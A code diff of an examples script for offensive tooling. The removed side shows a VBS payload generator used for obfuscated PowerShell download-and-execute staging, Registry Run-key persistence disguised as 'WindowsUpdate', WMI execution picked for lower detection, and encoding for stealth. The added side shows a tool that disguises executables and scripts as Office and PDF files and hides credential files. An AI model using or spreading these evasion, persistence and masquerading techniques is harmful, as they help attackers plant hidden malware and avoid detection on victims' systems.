@@ -1,216 +1,235 @@
 #!/usr/bin/env python3
 """
-Example payloads and usage demonstrations
-For authorized security testing and research
+File Disguiser - Real-World Usage Examples
 """
 
-from payload_generator import PayloadGenerator
+from file_disguiser import FileDisguiser, DisguiseType
 
 
-def example_1_basic_command_execution():
-    """Example 1: Execute a simple command"""
-    print("=" * 60)
-    print("Example 1: Basic Command Execution")
-    print("=" * 60)
+def example_1_hide_config():
+    """Hide configuration files as innocuous types."""
+    print("=== Example 1: Hide Configuration Files ===\n")
 
-    gen = PayloadGenerator()
-    cmd = "cmd /c echo Security Test"
+    disguiser = FileDisguiser("./examples/configs")
 
-    print("\n[*] Command:", cmd)
-    print("\n[*] Using basic technique:")
-    payload = gen.generate(cmd, technique="basic")
-    print(payload)
+    # Hide API config as log file
+    api_config = """
+[api]
+endpoint=https://api.example.com
+key=sk_live_abc123def456
+secret=sk_secret_xyz789
+timeout=30
+retry_count=3
+"""
 
-    print("\n[*] Using base64 obfuscation:")
-    payload = gen.generate(cmd, technique="base64")
-    print(payload)
+    path = disguiser.write_disguised_text("app_config", api_config, DisguiseType.LOG)
+    print(f"✓ Hidden API config as: {path}")
 
+    # Hide database credentials as JSON (ironic)
+    db_creds = """
+{
+  "host": "db.internal.example.com",
+  "port": 5432,
+  "user": "admin",
+  "password": "SuperSecretPassword123!",
+  "database": "production"
+}
+"""
 
-def example_2_powershell_execution():
-    """Example 2: PowerShell command execution"""
-    print("\n" + "=" * 60)
-    print("Example 2: PowerShell Execution")
-    print("=" * 60)
-
-    gen = PayloadGenerator()
-    cmd = 'powershell.exe -NoProfile -WindowStyle Hidden -Command "Write-Host \'Test\'"'
-
-    print("\n[*] Command:", cmd)
-    print("\n[*] Using WMI technique (less detected):")
-    payload = gen.generate(cmd, technique="wmi")
-    print(payload)
-
-    print("\n[*] Using registry storage:")
-    payload = gen.generate(cmd, technique="registry")
-    print(payload)
+    db_path = disguiser.write_disguised_text("database", db_creds, DisguiseType.JSON)
+    print(f"✓ Hidden DB credentials as: {db_path}\n")
 
 
-def example_3_multi_stage_payload():
-    """Example 3: Multi-stage payload download and execution"""
-    print("\n" + "=" * 60)
-    print("Example 3: Multi-Stage Payload")
-    print("=" * 60)
+def example_2_hide_scripts():
+    """Hide executable scripts as document types."""
+    print("=== Example 2: Hide Scripts as Documents ===\n")
 
-    gen = PayloadGenerator()
-    # This would normally fetch from your C2 or test server
-    cmd = (
-        'powershell.exe -NoProfile -Command '
-        '"(New-Object Net.WebClient).DownloadFile(\'http://localhost:8000/stage2.ps1\','
-        '\'$env:temp\\\\stage2.ps1\'); & $env:temp\\\\stage2.ps1"'
-    )
+    disguiser = FileDisguiser("./examples/scripts")
 
-    print("\n[*] Multi-stage download and execution")
-    print("\n[*] Using multi-encoding for stealth:")
-    payload = gen.generate(cmd, technique="multi_encoding")
-    print(payload[:500] + "..." if len(payload) > 500 else payload)
+    # Hide Python script as PDF
+    python_script = """#!/usr/bin/env python3
+import sys
+import os
 
+def main():
+    print("Hidden Python script running...")
+    data = sys.argv[1] if len(sys.argv) > 1 else "default"
+    process(data)
 
-def example_4_registry_persistence():
-    """Example 4: Registry persistence mechanism"""
-    print("\n" + "=" * 60)
-    print("Example 4: Registry Persistence")
-    print("=" * 60)
+def process(data):
+    # Do something with data
+    pass
 
-    gen = PayloadGenerator()
-    # Add to Run key for persistence
-    cmd = (
-        "cmd /c reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run "
-        "/v WindowsUpdate /d \"powershell -Command Write-Host test\" /f"
-    )
+if __name__ == "__main__":
+    main()
+"""
 
-    print("\n[*] Registry persistence command")
-    print("\n[*] Using registry technique:")
-    payload = gen.generate(cmd, technique="registry")
-    print(payload)
+    path = disguiser.write_disguised_text("automation", python_script, DisguiseType.PDF)
+    print(f"✓ Hidden Python script as PDF: {path}")
 
+    # Hide Bash script as Word document
+    bash_script = """#!/bin/bash
 
-def example_5_environment_variable_hiding():
-    """Example 5: Command hidden in environment variables"""
-    print("\n" + "=" * 60)
-    print("Example 5: Environment Variable Obfuscation")
-    print("=" * 60)
+# System monitoring script
+LOGFILE="/var/log/monitor.log"
+THRESHOLD=80
 
-    gen = PayloadGenerator()
-    cmd = "powershell.exe -Command Get-Process"
+check_disk_usage() {
+    usage=$(df / | awk 'NR==2 {print $5}' | cut -d'%' -f1)
+    if [ "$usage" -gt "$THRESHOLD" ]; then
+        echo "WARNING: Disk usage at $usage%" >> "$LOGFILE"
+    fi
+}
 
-    print("\n[*] Using environment variable storage for stealth:")
-    payload = gen.generate(cmd, technique="env")
-    print(payload[:500] + "..." if len(payload) > 500 else payload)
+check_memory() {
+    # Check system memory
+    free -h | grep Mem
+}
 
+main() {
+    check_disk_usage
+    check_memory
+}
 
-def example_6_wmi_execution():
-    """Example 6: WMI-based execution (less commonly detected)"""
-    print("\n" + "=" * 60)
-    print("Example 6: WMI Process Execution")
-    print("=" * 60)
+main "$@"
+"""
 
-    gen = PayloadGenerator()
-    cmd = "C:\\\\Windows\\\\System32\\\\cmd.exe /c powershell.exe -NoProfile -Command Test-Path $env:temp"
-
-    print("\n[*] WMI execution (Win32_Process):")
-    payload = gen.generate(cmd, technique="wmi")
-    print(payload)
+    bash_path = disguiser.write_disguised_text("monitor", bash_script, DisguiseType.DOCX)
+    print(f"✓ Hidden Bash script as Word document: {bash_path}\n")
 
 
-def example_7_obfuscated_function_calls():
-    """Example 7: Obfuscated function names"""
-    print("\n" + "=" * 60)
-    print("Example 7: Obfuscated Function Calls")
-    print("=" * 60)
+def example_3_hide_payloads():
+    """Hide binary payloads as common file types."""
+    print("=== Example 3: Hide Binary Payloads ===\n")
 
-    gen = PayloadGenerator()
-    cmd = "cmd /c whoami"
+    disguiser = FileDisguiser("./examples/payloads")
 
-    print("\n[*] With obfuscated function names (string concatenation):")
-    payload = gen.generate(cmd, technique="obfuscated_calls")
-    print(payload)
+    # Simulate binary payload (real executables would be used in practice)
+    fake_payload = b"\x4d\x5a\x90\x00\x03\x00\x00\x00" + b"PAYLOAD_DATA" * 50
 
+    # Hide as Office document
+    exe_path = disguiser.write_disguised_binary("document", fake_payload, DisguiseType.DOCX)
+    print(f"✓ Hidden binary payload as DOCX: {exe_path}")
 
-def example_8_all_techniques():
-    """Example 8: Show all available techniques for comparison"""
-    print("\n" + "=" * 60)
-    print("Example 8: All Available Techniques")
-    print("=" * 60)
+    # Hide as PDF
+    pdf_path = disguiser.write_disguised_binary("report", fake_payload, DisguiseType.PDF)
+    print(f"✓ Hidden binary payload as PDF: {pdf_path}")
 
-    gen = PayloadGenerator()
-    cmd = "cmd /c echo Test"
-
-    print("\n[*] Available techniques:")
-    for technique in gen.list_techniques():
-        info = gen.get_technique_info(technique)
-        print(f"  - {technique:<20} : {info}")
+    # Hide as Excel spreadsheet
+    xls_path = disguiser.write_disguised_binary("data", fake_payload, DisguiseType.XLSX)
+    print(f"✓ Hidden binary payload as XLSX: {xls_path}\n")
 
 
-def example_9_high_obfuscation():
-    """Example 9: High obfuscation level with polymorphic wrapper"""
-    print("\n" + "=" * 60)
-    print("Example 9: High Obfuscation with Polymorphism")
-    print("=" * 60)
+def example_4_track_and_manage():
+    """Track disguised files and manage them."""
+    print("=== Example 4: Track and Manage Files ===\n")
 
-    gen = PayloadGenerator()
-    cmd = "powershell.exe -Command Get-Content $env:temp\\\\test.txt"
+    disguiser = FileDisguiser("./examples/managed")
 
-    print("\n[*] Using high obfuscation (polymorphic wrapper):")
-    payload = gen.generate(cmd, technique="hidden_execution", obfuscation_level="high")
-    print(payload[:500] + "..." if len(payload) > 500 else payload)
-    print(f"\n[*] Total payload size: {len(payload)} bytes")
+    # Create multiple disguised files
+    files_to_create = [
+        ("secret1", "This is secret data 1", DisguiseType.TXT),
+        ("secret2", "This is secret data 2", DisguiseType.LOG),
+        ("secret3", b"Binary secret data 3", DisguiseType.PDF),
+    ]
+
+    for name, content, disguise in files_to_create:
+        if isinstance(content, bytes):
+            disguiser.write_disguised_binary(name, content, disguise)
+        else:
+            disguiser.write_disguised_text(name, content, disguise)
+
+    # List all tracked files
+    print("Tracked disguised files:")
+    for info in disguiser.list_disguised_files():
+        print(f"  - {info['original_name']}.{info['disguise_ext']} "
+              f"({info['size']} bytes, type: {info['content_type']})")
+
+    print()
 
 
-def example_10_file_writer_injection():
-    """Example 10: Write command to file then execute"""
-    print("\n" + "=" * 60)
-    print("Example 10: File Writer Injection")
-    print("=" * 60)
+def example_5_extract_recover():
+    """Create and recover disguised files."""
+    print("=== Example 5: Extract and Recover Files ===\n")
 
-    gen = PayloadGenerator()
-    cmd = "powershell.exe -Command \"Write-Host \\\"Security Testing\\\"; Get-Date\""
+    disguiser = FileDisguiser("./examples/recovery")
 
-    print("\n[*] Writing command to temp file then executing:")
-    payload = gen.generate(cmd, technique="filewriter")
-    print(payload)
+    # Hide some data
+    original_content = "CONFIDENTIAL: Project Apollo Status Report\n\nPhase 1: Complete\nPhase 2: In Progress\nPhase 3: Pending"
+    hidden_path = disguiser.write_disguised_text("report", original_content, DisguiseType.PDF)
+    print(f"✓ Hidden file as: {hidden_path}")
+
+    # Later, recover it
+    recovered_path = disguiser.undisguise(hidden_path)
+    print(f"✓ Recovered to: {recovered_path}")
+
+    # Verify content
+    with open(recovered_path, 'r') as f:
+        recovered_content = f.read()
+    print(f"✓ Content verified: {recovered_content[:50]}...\n")
+
+
+def example_6_batch_operations():
+    """Batch hide and organize multiple files."""
+    print("=== Example 6: Batch Operations ===\n")
+
+    disguiser = FileDisguiser("./examples/batch")
+
+    # Simulate multiple file sources
+    file_sources = {
+        "application": ("app.py", "def main(): pass", DisguiseType.TXT),
+        "configuration": ("config.ini", "[settings]\nkey=value", DisguiseType.LOG),
+        "credentials": ("auth.json", '{"token": "xyz123"}', DisguiseType.JSON),
+    }
+
+    print("Processing batch operation...")
+    for category, (filename, content, disguise) in file_sources.items():
+        disguiser.write_disguised_text(filename.replace(".py", "").replace(".ini", "").replace(".json", ""),
+                                       content, disguise)
+        print(f"  ✓ {filename} -> .{disguise.value}")
+
+    print(f"\n✓ Total files hidden: {len(disguiser.list_disguised_files())}\n")
+
+
+def example_7_custom_extensions():
+    """Use custom or non-standard extensions."""
+    print("=== Example 7: Custom Extensions ===\n")
+
+    disguiser = FileDisguiser("./examples/custom")
+
+    # Use any custom extension
+    content = "Custom extension content"
+    
+    custom_ext_1 = disguiser.write_disguised_text("file", content, "custom")
+    print(f"✓ Custom extension: {custom_ext_1}")
+
+    custom_ext_2 = disguiser.write_disguised_text("data", content, "xyz123")
+    print(f"✓ Custom extension: {custom_ext_2}")
+
+    # Even unusual combinations
+    custom_ext_3 = disguiser.write_disguised_text("obscure", content, "backup_old")
+    print(f"✓ Unusual extension: {custom_ext_3}\n")
 
 
 if __name__ == "__main__":
-    import sys
+    print("\n" + "="*60)
+    print("FILE DISGUISER - USAGE EXAMPLES")
+    print("="*60 + "\n")
 
-    if len(sys.argv) > 1:
-        example_num = sys.argv[1]
-        examples = {
-            "1": example_1_basic_command_execution,
-            "2": example_2_powershell_execution,
-            "3": example_3_multi_stage_payload,
-            "4": example_4_registry_persistence,
-            "5": example_5_environment_variable_hiding,
-            "6": example_6_wmi_execution,
-            "7": example_7_obfuscated_function_calls,
-            "8": example_8_all_techniques,
-            "9": example_9_high_obfuscation,
-            "10": example_10_file_writer_injection,
-        }
+    try:
+        example_1_hide_config()
+        example_2_hide_scripts()
+        example_3_hide_payloads()
+        example_4_track_and_manage()
+        example_5_extract_recover()
+        example_6_batch_operations()
+        example_7_custom_extensions()
 
-        if example_num in examples:
-            examples[example_num]()
-        else:
-            print("Usage: python examples.py [1-10]")
-    else:
-        print("VBS Payload Generation Examples")
-        print("==============================\n")
-        print("Run individual examples:")
-        print("  python examples.py 1   - Basic command execution")
-        print("  python examples.py 2   - PowerShell execution")
-        print("  python examples.py 3   - Multi-stage payload")
-        print("  python examples.py 4   - Registry persistence")
-        print("  python examples.py 5   - Environment variable hiding")
-        print("  python examples.py 6   - WMI execution")
-        print("  python examples.py 7   - Obfuscated function calls")
-        print("  python examples.py 8   - List all techniques")
-        print("  python examples.py 9   - High obfuscation")
-        print("  python examples.py 10  - File writer injection")
-        print("\nOr run all examples: python examples.py all")
+        print("="*60)
+        print("All examples completed successfully!")
+        print("="*60 + "\n")
 
-        if len(sys.argv) > 1 and sys.argv[1] == "all":
-            for i in range(1, 11):
-                try:
-                    locals()[f"example_{i}_"]()
-                except:
-                    pass
+    except Exception as e:
+        print(f"Error running examples: {e}")
+        import traceback
+        traceback.print_exc()
